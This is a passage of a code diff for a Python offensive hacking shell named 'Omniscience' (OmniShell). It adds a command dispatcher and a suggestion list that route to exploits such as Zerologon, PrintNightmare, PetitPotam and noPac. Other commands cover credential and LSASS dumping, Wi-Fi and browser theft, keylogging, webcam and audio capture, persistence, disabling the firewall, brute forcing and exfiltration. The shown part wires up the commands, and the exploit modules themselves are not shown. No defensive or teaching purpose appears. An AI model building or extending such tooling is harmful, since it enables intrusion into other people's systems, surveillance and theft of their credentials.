-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-                HackerSounds.alert()
-                if self.discovery:
-                    self.hosts = self.discovery.ultramax_global_scan()
-                        print(f"\n{Fore.GREEN}[+] GLOBAL SCAN COMPLETE - {len(self.hosts)} DEVICES DISCOVERED")
-                    self._show_hosts_table()
-
-                elif cmd == "phone":
-                    target = args[0] if args else self.selected_target
-                if not target:
-                        print(f"{Fore.RED}[!] No target selected. Use 'phone <ip>'")
-                    return
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  MOBILE DEVICE EXPLOITATION: {target}")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    result = self.control.mobile_exploit_auto(target)
-                    if result.get('success'):
-                        HackerSounds.exploit_success()
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ MOBILE EXPLOIT SUCCESS")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Device type: {result.get('type')}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Control level: {result.get('control')}")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-                    else:
-                        print(f"{Fore.RED}  ❌ Mobile exploit failed")
-
-            # ==================== UNKNOWN ====================
-                    else:
-                self._log(f"{Fore.RED}Unknown command: {cmd}. Type 'help' for 140+ commands.")
+            else:
+                # Intelligent command not found handler
+                HackerSounds.invalid_command()
+                
+                # Levenshtein distance for command suggestions
+                def levenshtein(s1, s2):
+                    if len(s1) < len(s2):
+                        return levenshtein(s2, s1)
+                    if len(s2) == 0:
+                        return len(s1)
+                    previous_row = range(len(s2) + 1)
+                    for i, c1 in enumerate(s1):
+                        current_row = [i + 1]
+                        for j, c2 in enumerate(s2):
+                            insertions = previous_row[j + 1] + 1
+                            deletions = current_row[j] + 1
+                            substitutions = previous_row[j] + (c1 != c2)
+                            current_row.append(min(insertions, deletions, substitutions))
+                        previous_row = current_row
+                    return previous_row[-1]
+                
+                all_commands = ['help', 'exit', 'quit', 'clear', 'history', 'auto', 'globalscan', 'scan', 'fastscan', 'targets', 'select', 'target', 'attack', 'pwnall', 'pwn', 'exploit', 'mobile', 'scan-exploit', 'smbghost', 'printnightmare', 'petitpotam', 'zerologon', 'smb-vulns', 'etblue-check', 'bluekeep-check', 'kerberoast', 'password-spray', 'lateral', 'db-dump', 'exfiltrate', 'exec', 'screen', 'monitor', 'live', 'webcam', 'audio', 'keylog', 'shutdown', 'reboot', 'winrm-exec', 'sysinfo', 'systeminfo', 'extract', 'harvest', 'steal-wifi', 'stealcreds', 'lsass-dump', 'tokens', 'nethashes', 'vault', 'omnifetch', 'db-extract', 'cloud-attack', 's3-scan', 'mysql-root', 'postgres', 'file', 'upload', 'download', 'persist', 'persist-task', 'adduser', 'rdp-enable', 'firewall-off', 'firewall-on', 'firewall-add', 'media', 'pslist', 'killproc', 'svc-list', 'processes', 'sniff', 'stopsniff', 'creds', 'dns-log', 'ssh-brute', 'rdp-brute', 'vnc-brute', 'telnet-brute', 'dashboard', 'status', 'gateway', 'external-ip', 'setcreds', 'setdomain', 'clipboard-get', 'clipboard-set', 'arp', 'icmp', 'netbios', 'snmp', 'mdns', 'nopac', 'etblue-check']
+                
+                suggestions = []
+                for command in all_commands:
+                    dist = levenshtein(cmd, command)
+                    if dist <= 3:
+                        suggestions.append((dist, command))
+                
+                suggestions.sort()
+                
+                self._log(f"\n{Fore.RED}{Style.BRIGHT}✘  UNKNOWN COMMAND: {Fore.WHITE}{cmd}")
+                if suggestions:
+                    self._log(f"\n{Fore.YELLOW}   Did you mean:")
+                    for dist, command in suggestions[:3]:
+                        self._log(f"{Fore.GREEN}     • {command}")
+                self._log(f"\n{Fore.CYAN}   Type 'help' for full command list with 140+ commands\n")
 
         except Exception as e:
-            self._log(f"{Fore.RED}Error: {e}")
+            HackerSounds.command_error()
+            self._log(f"\n{Fore.RED}{Style.BRIGHT}✘  COMMAND FAILED")
+            self._log(f"{Fore.RED}   Error: {str(e)}")
+            import traceback
+            logger.error(f"Command failed: {cmd} | Error: {str(e)} | Traceback: {traceback.format_exc()}")
+            self._log(f"\n{Fore.YELLOW}   The error has been logged. Use 'help' for correct syntax.\n")
+
+    def _show_hosts_table(self):
+        if not self.hosts:
+            self._log("No hosts discovered.")
+            return
+        headers = ["ID", "IP Address", "Status"]
+        rows = []
+        for i, host in enumerate(self.hosts):
+            ip = host if isinstance(host, str) else (host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host)))
+            status = "Discovered"
+            rows.append([str(i), ip, status])
+        Visualizer.table(headers, rows, "Discovered Hosts")
+
+    def _handle_tree_command(self, tree_cmd, sub_cmd, tree_args):
+        """Handle tree-based commands like scan, exploit, control, etc."""
+        try:
+            HackerSoundsEx.on_action()
+        except: pass
+        
+        target = self.selected_target
+        
+        if tree_cmd == "scan":
+            if sub_cmd == "auto":
+                self.process_command("auto")
+                return True
+            elif sub_cmd == "fast":
+                self.process_command("fastscan")
+                return True
+            elif sub_cmd == "deep" and tree_args:
+                self.process_command(f"scan {tree_args[0]}")
+                return True
+            elif sub_cmd == "arp":
+                self.process_command(f"arp {tree_args[0] if tree_args else ''}")
+                return True
+            elif sub_cmd == "icmp":
+                self.process_command(f"icmp {tree_args[0] if tree_args else ''}")
+                return True
+            elif sub_cmd == "netbios" and tree_args:
+                self.process_command(f"netbios {tree_args[0]}")
+                return True
+            elif sub_cmd == "snmp" and tree_args:
+                self.process_command(f"snmp {tree_args[0]}")
+                return True
+            elif sub_cmd == "mdns":
+                self.process_command("mdns")
+                return True
+            elif sub_cmd == "ssdp":
+                self.process_command("ssdp")
+                return True
+            elif sub_cmd == "range" and tree_args:
+                self.process_command(f"scan {tree_args[0]}")
+                return True
+            elif sub_cmd == "cloud" and tree_args:
+                self.process_command(f"cloud-scan {tree_args[0]}")
+                return True
+        
+        elif tree_cmd == "exploit":
+            if sub_cmd == "auto" and tree_args:
+                self.process_command(f"pwn {tree_args[0]}")
+                return True
+            elif sub_cmd == "smb" and tree_args:
+                ip = tree_args[1] if len(tree_args) > 1 and '.' in str(tree_args[1]) else (self.selected_target or "")
+                smb_action = tree_args[0] if tree_args[0] in ['ghost', 'blue', 'vulns'] else 'vulns'
+                if smb_action == "ghost":
+                    self.process_command(f"smbghost {ip}")
+                elif smb_action == "blue":
+                    self.process_command(f"etblue-check {ip}")
+                elif smb_action == "vulns":
+                    self.process_command(f"smb-vulns {ip}")
+                return True
+            elif sub_cmd == "rdp" and tree_args:
+                ip = tree_args[1] if len(tree_args) > 1 and '.' in str(tree_args[1]) else (self.selected_target or "")
+                if tree_args[0] == "bluekeep":
+                    self.process_command(f"bluekeep-check {ip}")
+                elif tree_args[0] == "brute":
+                    self.process_command(f"rdp-brute {ip}")
+                return True
+            elif sub_cmd == "print" and tree_args:
+                ip = tree_args[1] if len(tree_args) > 1 and '.' in str(tree_args[1]) else (self.selected_target or "")
+                if tree_args[0] == "nightmare":
+                    self.process_command(f"printnightmare {ip}")
+                elif tree_args[0] == "spooler":
+                    self.process_command(f"smb-vulns {ip}")
+                return True
+            elif sub_cmd == "ntlm" and tree_args:
+                ip = tree_args[1] if len(tree_args) > 1 and '.' in str(tree_args[1]) else (self.selected_target or "")
+                if tree_args[0] == "petitpotam":
+                    self.process_command(f"petitpotam {ip}")
+                elif tree_args[0] == "zerologon":
+                    self.process_command(f"zerologon {ip}")
+                elif tree_args[0] == "nopac":
+                    self.process_command(f"nopac {ip}")
+                return True
+            elif sub_cmd == "ssh" and tree_args:
+                ip = tree_args[1] if len(tree_args) > 1 and '.' in str(tree_args[1]) else (self.selected_target or "")
+                if tree_args[0] == "brute":
+                    self.process_command(f"ssh-brute {ip}")
+                elif tree_args[0] == "exec" and ip:
+                    cmd = " ".join(tree_args[2:]) if len(tree_args) > 2 else "whoami"
+                    self.process_command(f"ssh-exec {ip} {cmd}")
+                return True
+        
+        elif tree_cmd == "control":
+            if sub_cmd == "exec" and tree_args:
+                self.process_command(f"exec {' '.join(tree_args)}")
+                return True
+            elif sub_cmd == "shell":
+                self.process_command("exec cmd.exe")
+                return True
+            elif sub_cmd == "powershell" and tree_args:
+                self.process_command(f"exec powershell -Command {' '.join(tree_args)}")
+                return True
+            elif sub_cmd == "upload" and tree_args:
+                local = tree_args[0]
+                remote = tree_args[1] if len(tree_args) > 1 else "C$tempomni.exe"
+                self.process_command(f"upload {local} {remote}")
+                return True
+            elif sub_cmd == "download" and tree_args:
+                remote = tree_args[0]
+                local = tree_args[1] if len(tree_args) > 1 else "downloaded"
+                self.process_command(f"download {remote} {local}")
+                return True
+        
+        elif tree_cmd == "gather":
+            if sub_cmd == "all":
+                self.process_command("extract")
+                return True
+            elif sub_cmd == "creds":
+                self.process_command("stealcreds")
+                return True
+            elif sub_cmd == "wifi":
+                self.process_command("steal-wifi")
+                return True
+            elif sub_cmd == "browser":
+                self.process_command("omnifetch")
+                return True
+            elif sub_cmd == "tokens":
+                self.process_command("tokens")
+                return True
+            elif sub_cmd == "hashes":
+                self.process_command("nethashes")
+                return True
+            elif sub_cmd == "lsass":
+                self.process_command("lsass-dump")
+                return True
+            elif sub_cmd == "vault":
+                self.process_command("vault")
+                return True
+        
+        elif tree_cmd == "persistence":
+            if sub_cmd == "auto":
+                self.process_command("persist")
+                return True
+            elif sub_cmd == "service" and len(tree_args) >= 2:
+                self.process_command(f"persist-task {tree_args[0]} {tree_args[1]}")
+                return True
+            elif sub_cmd == "registry" and len(tree_args) >= 2:
+                self.process_command(f"persist-task {tree_args[0]} {tree_args[1]}")
+                return True
+            elif sub_cmd == "scheduled" and len(tree_args) >= 2:
+                self.process_command(f"persist-task {tree_args[0]} {tree_args[1]}")
+                return True
+        
+        elif tree_cmd == "lateral":
+            if sub_cmd == "scan":
+                self.process_command("auto")
+                return True
+            elif sub_cmd == "psexec" and tree_args:
+                self.process_command(f"lateral {self.selected_target or ''} {tree_args[0]}")
+                return True
+            elif sub_cmd == "winrm" and tree_args:
+                self.process_command(f"winrm-exec {tree_args[0]} whoami")
+                return True
+            elif sub_cmd == "ssh" and tree_args:
+                self.process_command(f"ssh-exec {tree_args[0]} whoami")
+                return True
+        
+        elif tree_cmd == "monitor":
+            if sub_cmd == "screen":
+                self.process_command("screen")
+                return True
+            elif sub_cmd == "keys":
+                self.process_command("keylog")
+                return True
+            elif sub_cmd == "clipboard":
+                self.process_command("clipboard-get")
+                return True
+            elif sub_cmd == "webcam":
+                self.process_command("webcam")
+                return True
+            elif sub_cmd == "audio":
+                dur = tree_args[0] if tree_args else "10"
+                self.process_command(f"audio {dur}")
+                return True
+            elif sub_cmd == "process":
+                self.process_command("pslist")
+                return True
+        
+        elif tree_cmd == "db":
+            if sub_cmd == "mysql" and len(tree_args) >= 1:
+                if tree_args[0] == "root" and len(tree_args) > 1:
+                    self.process_command(f"mysql-root {tree_args[1]}")
+                elif tree_args[0] == "dump" and len(tree_args) > 2:
+                    self.process_command(f"db-extract {tree_args[1]} 3306 mysql")
+                return True
+            elif sub_cmd == "postgres" and len(tree_args) >= 1:
+                if tree_args[0] == "root" and len(tree_args) > 1:
+                    self.process_command(f"postgres {tree_args[1]}")
+                elif tree_args[0] == "dump" and len(tree_args) > 2:
+                    self.process_command(f"db-extract {tree_args[1]} 5432 postgres")
+                return True
+            elif sub_cmd == "mssql" and len(tree_args) >= 1:
+                if tree_args[0] == "exec" and len(tree_args) > 2:
+                    self.process_command(f"db-extract {tree_args[1]} 1433 mssql")
+                return True
+        
+        elif tree_cmd == "cloud":
+            if sub_cmd == "aws" and len(tree_args) >= 1:
+                if tree_args[0] == "s3" and len(tree_args) > 1:
+                    self.process_command(f"s3-scan {tree_args[1]}")
+                else:
+                    self.process_command("cloud-scan aws")
+                return True
+            elif sub_cmd == "azure" and len(tree_args) >= 1:
+                self.process_command("cloud-scan azure")
+                return True
+        
+        elif tree_cmd == "show":
+            if sub_cmd == "targets":
+                self.process_command("targets")
+                return True
+            elif sub_cmd == "sessions":
+                self._log(f"{Fore.CYAN}Active Sessions:")
+                self._log(f"  Compromised: {len(self.compromised)}")
+                self._log(f"  Targeting: {len(self.targeting)}")
+                return True
+            elif sub_cmd == "network":
+                self.process_command("network")
+                return True
+            elif sub_cmd == "modules":
+                mods_ok = sum(1 for x in [self.discovery, self.intel, self.control, self.adv_scan, self.center, self.universal] if x)
+                self._log(f"{Fore.CYAN}Loaded Modules: {mods_ok}/6")
+                return True
+        
+        elif tree_cmd == "set":
+            if sub_cmd == "target" and tree_args:
+                self.process_command(f"target {tree_args[0]}")
+                return True
+            elif sub_cmd == "creds" and len(tree_args) >= 2:
+                self.process_command(f"setcreds {tree_args[0]} {tree_args[1]}")
+                return True
+            elif sub_cmd == "domain" and tree_args:
+                self.process_command(f"setdomain {tree_args[0]}")
+                return True
+            elif sub_cmd == "interface" and tree_args:
+                try:
+                    self.selected_interface = int(tree_args[0])
+                    self._log(f"{Fore.GREEN}Interface set to {tree_args[0]}")
+                except: pass
+                return True
+        
+        return False
+
+    def _display_right_panel(self):
+        try:
+            Visualizer.draw_right_sidebar()
+        except:
+            pass
+
+    def _print_dashboard(self):
+        self._log(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════════╗")
+        self._log(f"{Fore.CYAN}{Style.BRIGHT}║                  OMNISCIENCE SYSTEM DASHBOARD                 ║")
+        self._log(f"{Fore.CYAN}{Style.BRIGHT}╠════════════════════════════════════════════════════════════╣")
+        self._log(f"{Fore.LIGHTGREEN_EX}  Hosts Discovered: {len(self.hosts)}")
+        self._log(f"{Fore.LIGHTGREEN_EX}  Selected Target: {self.selected_target or 'None'}")
+        self._log(f"{Fore.LIGHTGREEN_EX}  Credentials: {self.credentials['user']} / {'*' * len(self.credentials['pass'])}")
+        self._log(f"{Fore.LIGHTGREEN_EX}  Active Modules: {sum(1 for x in [self.discovery, self.intel, self.control, self.adv_scan, self.center, self.universal] if x)}/6")
+        self._log(f"{Fore.LIGHTGREEN_EX}  Session Uptime: {str(datetime.now() - self._start_time).split('.')[0]}")
+        self._log(f"{Fore.CYAN}{Style.BRIGHT}╚════════════════════════════════════════════════════════════╝\n")
 
 if __name__ == "__main__":
     import sys
@@ -3205,7 +3537,7 @@ if __name__ == "__main__":
         # Initialize and run the shell
         shell = OmniShell()
         shell.run()
-                    else:
+    else:
         # Launch new command line window
         try:
             # Get the current Python executable and script path
@@ -3218,11 +3550,11 @@ if __name__ == "__main__":
 
             # Play launch sound and exit current process
             HackerSounds.access_granted()
-                        print(f"{Fore.GREEN}Launching Omniscience Command Interface...")
+            print(f"{Fore.GREEN}Launching Omniscience Command Interface...")
             time.sleep(1)
             sys.exit(0)
         except Exception as e:
-                        print(f"Failed to launch new window: {e}")
+            print(f"Failed to launch new window: {e}")
             # Fallback to current window
             MatrixEffects.intro_cycle(12)
             shell = OmniShell()
